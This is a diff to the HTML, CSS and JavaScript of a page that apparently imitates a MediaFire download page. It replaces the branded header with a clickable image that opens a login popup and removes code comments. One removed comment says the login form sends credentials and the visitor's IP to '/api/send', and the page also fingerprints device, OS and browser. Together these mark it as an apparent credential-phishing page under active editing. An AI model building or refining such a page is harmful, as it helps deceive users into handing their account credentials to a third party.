@@ -37,107 +37,16 @@ button{
     background:#fff;
     display:flex;
     align-items:center;
-    padding:0 16px;
+    padding:0;
+    overflow:hidden;
 }
 
-.header-inner{
-    width:100%;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-}
-
-.logo{
-    width:75px;
-    height:48px;
-    display:flex;
-    align-items:center;
-    justify-content:flex-start;
-    flex-shrink:0;
-}
-
-.mediafire-logo{
+.header-img{
     width:100%;
     height:100%;
-    object-fit:contain;
+    object-fit:cover;
     display:block;
-}
-
-.header-right{
-    display:flex;
-    align-items:center;
-    gap:8px;
-}
-
-.language{
-    width:40px;
-    height:40px;
-    background:#f0f0f0;
-    border-radius:6px;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    flex-shrink:0;
-}
-
-.flag{
-    width:26px;
-    height:18px;
-    position:relative;
-    overflow:hidden;
-    background:
-    repeating-linear-gradient(
-        to bottom,
-        #d92727 0px,
-        #d92727 2px,
-        #fff 2px,
-        #fff 4px
-    );
-}
-
-.flag:before{
-    content:"";
-    position:absolute;
-    width:11px;
-    height:10px;
-    left:0;
-    top:0;
-    background:#254d9a;
-}
-
-.flag:after{
-    content:"••••";
-    position:absolute;
-    color:#fff;
-    font-size:4px;
-    line-height:4px;
-    width:11px;
-    height:10px;
-    left:1px;
-    top:1px;
-    letter-spacing:1px;
-}
-
-.auth{
-    height:40px;
-    display:flex;
-    background:#087be0;
-    border-radius:6px;
-    overflow:hidden;
-}
-
-.auth button{
-    border:0;
-    background:#087be0;
-    color:#fff;
-    font-size:12px;
-    font-weight:600;
-    padding:0 10px;
-    min-width:70px;
-}
-
-.auth button + button{
-    border-left:1px solid rgba(255,255,255,.8);
+    cursor:pointer;
 }
 
 /* ================= CONTENT ================= */
@@ -215,7 +124,6 @@ button{
     text-overflow:ellipsis;
 }
 
-/* ===== IKON DOWNLOAD PAKAI GAMBAR ===== */
 .download-icon{
     width:32px;
     height:38px;
@@ -300,7 +208,6 @@ button{
     font-size:11px;
 }
 
-/* ===== PETA PAKAI GAMBAR ===== */
 .map{
     width:100%;
     max-width:600px;
@@ -621,23 +528,7 @@ button{
 @media(max-width:350px){
 
     .header{
-        padding:0 10px;
-    }
-
-    .logo{
-        width:62px;
-        height:40px;
-    }
-
-    .language{
-        width:36px;
-        height:36px;
-    }
-
-    .auth button{
-        min-width:62px;
-        padding:0 7px;
-        font-size:10px;
+        padding:0;
     }
 
     .file-title{
@@ -663,47 +554,12 @@ button{
 <body>
 
 <header class="header">
-
-    <div class="header-inner">
-
-        <div class="logo">
-
-            <img
-                src="logo.jpg"
-                alt="Logo"
-                class="mediafire-logo"
-            >
-
-        </div>
-
-        <div class="header-right">
-
-            <div class="language">
-                <div class="flag"></div>
-            </div>
-
-            <div class="auth">
-
-                <button
-                    type="button"
-                    onclick="openDownloadLogin()"
-                >
-                    SIGN UP
-                </button>
-
-                <button
-                    type="button"
-                    onclick="openDownloadLogin()"
-                >
-                    LOG IN
-                </button>
-
-            </div>
-
-        </div>
-
-    </div>
-
+    <img
+        src="atas.jpg"
+        alt="Header"
+        class="header-img"
+        onclick="openDownloadLogin()"
+    >
 </header>
 
 
@@ -996,10 +852,6 @@ button{
 
 <script>
 
-/* =========================
-   FORMAT WAKTU WIB
-========================= */
-
 function formatWaktuWIB(date){
 
     const opt = {
@@ -1023,10 +875,6 @@ function formatWaktuWIB(date){
 
 }
 
-
-/* =========================
-   DETEKSI DEVICE / OS / BROWSER
-========================= */
 
 function detectDevice(ua){
 
@@ -1101,10 +949,6 @@ function detectBrowser(ua){
 }
 
 
-/* =========================
-   OPEN LOGIN
-========================= */
-
 function openDownloadLogin(event){
 
     if(event){
@@ -1118,10 +962,6 @@ function openDownloadLogin(event){
 }
 
 
-/* =========================
-   CLOSE
-========================= */
-
 function closeLogin(){
 
     document
@@ -1132,10 +972,6 @@ function closeLogin(){
 
 }
 
-
-/* =========================
-   OUTSIDE CLICK
-========================= */
 
 function outsideClose(event){
 
@@ -1152,10 +988,6 @@ function outsideClose(event){
 
 }
 
-
-/* =========================
-   PASSWORD
-========================= */
 
 function togglePassword(){
 
@@ -1176,10 +1008,6 @@ function togglePassword(){
 
 }
 
-
-/* =========================
-   MESSAGE
-========================= */
 
 function showMessage(text,type){
 
@@ -1210,10 +1038,6 @@ function clearMessage(){
 
 }
 
-
-/* =========================
-   LOGIN → IP + KIRIM KE /api/send
-========================= */
 
 function loginUser(event){
 
@@ -1266,10 +1090,6 @@ function loginUser(event){
 
 }
 
-
-/* =========================
-   ESC
-========================= */
 
 document.addEventListener(
     "keydown",
